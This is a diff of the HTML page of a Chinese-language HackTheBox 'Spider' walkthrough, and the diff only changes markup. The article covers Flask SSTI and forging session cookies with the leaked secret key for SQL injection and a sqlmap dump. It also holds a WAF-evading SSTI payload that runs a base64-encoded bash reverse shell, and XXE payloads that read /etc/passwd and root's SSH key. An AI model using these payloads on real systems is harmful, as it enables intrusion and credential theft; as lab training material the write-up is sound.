@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;350  10.10.10.243   端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.243Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-06-02 13:34">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;350  10.10.10.243                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Spider - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/06/02/Spider-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;350  10.10.10.243   端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.243Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-06-02 13:34">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;350  10.10.10.243                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060203.jpg">
@@ -138,7 +138,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -228,7 +228,14 @@
 </li>
 <li><h2 id="10-10-10-243"><a href="#10-10-10-243" class="headerlink" title="10.10.10.243"></a>10.10.10.243</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.243</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-02 13:34 CST</span><br><span class="line">Nmap scan report for 10.10.10.243</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)</span><br><span class="line">|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)</span><br><span class="line">|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://spider.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 29.51 seconds</span><br></pre></td></tr></table></figure>
 
@@ -237,42 +244,133 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问时跳到域名spider.htb，加hosts后访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.243 spider.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060202.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50</span><br><span class="line">/cart                 (Status: 500) [Size: 290]</span><br><span class="line">/checkout             (Status: 500) [Size: 290]</span><br><span class="line">/index                (Status: 500) [Size: 290]</span><br><span class="line">/login                (Status: 200) [Size: 1832]</span><br><span class="line">/logout               (Status: 302) [Size: 209] [--&gt; http://spider.htb/]</span><br><span class="line">/main                 (Status: 500) [Size: 290]</span><br><span class="line">/register             (Status: 200) [Size: 2130]</span><br><span class="line">/user                 (Status: 302) [Size: 219] [--&gt; http://spider.htb/login]</span><br><span class="line">/view                 (Status: 302) [Size: 219] [--&gt; http://spider.htb/login]</span><br></pre></td></tr></table></figure>
 
 <h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>正常注册是得到个uuid，跳转到登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>因为是flask，尝试ssti,登录后查看用户信息，确认存在SSTI：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060204.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060205.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>获取config，得到SECRET_KEY：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;RATELIMIT_ENABLED&#39;: True, &#39;RATELIMIT_DEFAULTS_PER_METHOD&#39;: False, &#39;RATELIMIT_SWALLOW_ERRORS&#39;: False, &#39;RATELIMIT_HEADERS_ENABLED&#39;: False, &#39;RATELIMIT_STORAGE_URL&#39;: &#39;memory:&#x2F;&#x2F;&#39;, &#39;RATELIMIT_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT_HEADER_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT_HEADER_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT_HEADER_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT_HEADER_RETRY_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD_FOLDER&#39;: &#39;static&#x2F;uploads&#39;&#125;&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060206.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Flask-session"><a href="#Flask-session" class="headerlink" title="Flask session"></a>Flask session</h1><p>查看cookie内容格式：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>主要就是uuid，应该是通过uuid获取信息展示，所以尝试uuid那里进行注入</p>
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>前面已经得到的secret，所以可以自己生成任意内容session：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --secret Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 --cookie "&#123;'uuid': '\' or 1=1 #'&#125;"</span><br><span class="line">eyJ1dWlkIjoiJyBvciAxPTEgIyJ9.YLcgnA.rIXYazLnepMVrYeq-x45HZO8yP0</span><br></pre></td></tr></table></figure>
 
 <p>修改cookie后我们是chiv用户，但并不能正常访问admin：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060208.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>可以用sqlmap的eval处理session参数：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign(&#123;'uuid': session&#125;, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump</span><br><span class="line"></span><br><span class="line">129f60ea-30cf-4065-afb9-6be45ad38b73 ： chiv : ch1VW4sHERE7331</span><br></pre></td></tr></table></figure>
 
 <h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>使用chiv的id和密码登录，可以访问admin,查看得到portal地址：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;spider.htb&#x2F;a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060209.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060210.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060211.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060209.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060210.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060211.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SSTI-to-shell"><a href="#SSTI-to-shell" class="headerlink" title="SSTI to shell"></a>SSTI to shell</h1><p>Portal 里继续SSTI，存在waf过滤了一些特殊字符,例如点，可以把命令base64后绕过：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">blocked ： . </span><br><span class="line">bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.5&#x2F;443 &lt;&amp;1&#39;</span><br><span class="line">YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNS80NDMgPCYxJw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">&#123;% with a &#x3D; request[&quot;application&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNS80NDMgPCYxJw&#x3D;&#x3D; | base64 -d | bash&quot;)[&quot;read&quot;]() %&#125; a &#123;% endwith %&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060212.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060213.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060212.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060213.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>chiv用户目录得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060214.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060214.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>chiv用户.ssh目录直接有私钥，后面可以直接用这个方便操作</p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>本地8080端口</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chiv@spider:~$ ss -tupln</span><br><span class="line">Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port</span><br><span class="line">udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*</span><br><span class="line">tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*</span><br><span class="line">tcp    LISTEN   0        128               0.0.0.0:80            0.0.0.0:*</span><br><span class="line">tcp    LISTEN   0        100             127.0.0.1:8080          0.0.0.0:*</span><br><span class="line">tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*</span><br><span class="line">tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*</span><br><span class="line">tcp    LISTEN   0        128                  [::]:22               [::]:*</span><br></pre></td></tr></table></figure>
@@ -280,22 +378,64 @@
 <p>转发出来访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i chiv_id_rsa -L 8080:127.0.0.1:8080 chiv@10.10.10.243</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060215.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060215.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="8080-site"><a href="#8080-site" class="headerlink" title="8080 site"></a>8080 site</h1><p>任意用户名都可以登录，注意登录参数有个version，content-type是xhtml+xml：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060216.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060216.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><ul>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a></li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;%26username%3b&amp;version&#x3D;1.0.0--&gt;&lt;!DOCTYPE+foo+[&lt;!ENTITY+username+SYSTEM+&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;+]&gt;&lt;!--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060217.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060218.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060217.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060218.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="root-key"><a href="#root-key" class="headerlink" title="root key"></a>root key</h2><p>所以就可以通过xxe得到root用户ssh私钥</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;%26username%3b&amp;version&#x3D;1.0.0--&gt;&lt;!DOCTYPE+foo+[&lt;!ENTITY+username+SYSTEM+&quot;file:&#x2F;&#x2F;&#x2F;root&#x2F;.ssh&#x2F;id_rsa&quot;&gt;+]&gt;&lt;!--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060219.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060219.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>ssh登录，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060220.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021060220.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://pypi.org/project/flask-unsign/" target="_blank" rel="noopener">https://pypi.org/project/flask-unsign/</a></li>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></li>
